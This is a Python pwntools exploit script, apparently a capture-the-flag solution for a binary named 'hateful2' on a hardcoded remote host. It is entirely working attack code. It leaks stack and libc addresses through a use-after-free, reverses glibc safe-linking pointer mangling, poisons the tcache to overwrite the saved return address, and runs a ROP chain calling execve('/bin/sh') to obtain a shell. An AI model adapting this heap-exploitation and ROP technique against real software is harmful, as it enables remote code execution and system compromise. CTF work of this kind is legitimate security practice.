#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './hateful2')
libc = ELF(exe.libc.path)

host = args.HOST or '52.59.124.14'
port = int(args.PORT or 5022)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
# malloc
b *add_message+164

# read
# b *0x55555555549a

# ret
b *main+303

continue
'''.format(**locals())

context.terminal = "tmux splitw -h".split()

def malloc(idx, size, content):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b">> ", content)

def edit(idx, content):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())
    # io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b">> ", content)

def read(idx):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())

def free(idx):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())
    # io.sendlineafter(b"Size: ", str(size).encode())

def magic_obs2good(obs):
   middle_state = (obs >> 12 ^ obs)
   good = middle_state ^ middle_state >> 24
   return good

def magic_good2obs(obs, addr):
   good = (obs >> 12) ^ addr
   return good

"""
0x55555555b300: 0x000000055555555b      0x1627006dec95c59f
0x55555555b310: 0x4343434343434343      0x0043434343434343
"""

io = start()

io.sendlineafter(b">> ", b"0")
io.recvuntil(b"send up to ")

size = 0x100

stack_leak = int(io.recvline().split(b" ")[0])
rip = stack_leak + 0x34

print(f"[+] leak {hex(stack_leak)}")
print(f"[+] rip {hex(rip)}")

malloc(13, 0x1000, b"X")
malloc(14, 0x10, b"X")

free(13)
read(13)

libc_leak = u64(io.recvline().split(b": ")[1][:-1].ljust(8, b"\x00"))
libc.address = libc_leak - 0x1d2cc0

print( f"[+] libc_leak {hex(libc_leak)}" )
print( f"[+] libc.address {hex(libc.address)}" )



malloc(0, size, b"A"*(size-1)) # 0x55555555b2a0
malloc(1, size, b"B"*(size-1)) # 0x55555555b2d0
malloc(2, size, b"C"*(size-1)) # 0x55555555b2f0

free(2)
free(1)
free(0)

read(0)

io.recvuntil(b"Message: ")
got = io.recvline()[:-1]
# print(f"got {io.recvline()[:-1]}")

next_obs = u64(got.ljust(8, b"\x00"))
good_of_next_obs = magic_obs2good( next_obs )
addr = rip - 0x28
obsed_addr = magic_good2obs(good_of_next_obs, addr)
edit(1, p64(obsed_addr))

print(f"[+] next_obs {hex(next_obs)}")
print(f"[+] good_of_next_obs {hex(good_of_next_obs)}")
print(f"[+] addr {hex( addr )}")
print(f"[+] obsed_addr {hex( obsed_addr )}")


pop_rdi = libc.address + 0x00000000000277e5# : pop rdi ; ret
pop_rax = libc.address + 0x000000000003f197# : pop rax ; ret
pop_rdx = libc.address + 0x00000000000fde7d# : pop rdx ; ret
pop_rsi = libc.address + 0x0000000000028f99# : pop rsi ; ret
syscall = libc.address + 0x0000000000026428 #: syscall
binsh = next( libc.search(b"/bin/sh") )

# Control the RIP addr
malloc(0, size, b"X"*(size-1)) # 
malloc(1, size, b"G"*(size-1)) # 

payload  = b"A"*(8)

payload += p64(pop_rdi)
payload += p64(binsh)

payload += p64(pop_rdx)
payload += p64(0)

payload += p64(pop_rsi)
payload += p64(0)

payload += p64(pop_rax)
payload += p64(0x3b)

payload += p64(syscall)

malloc(2, size, payload) # 

io.interactive()
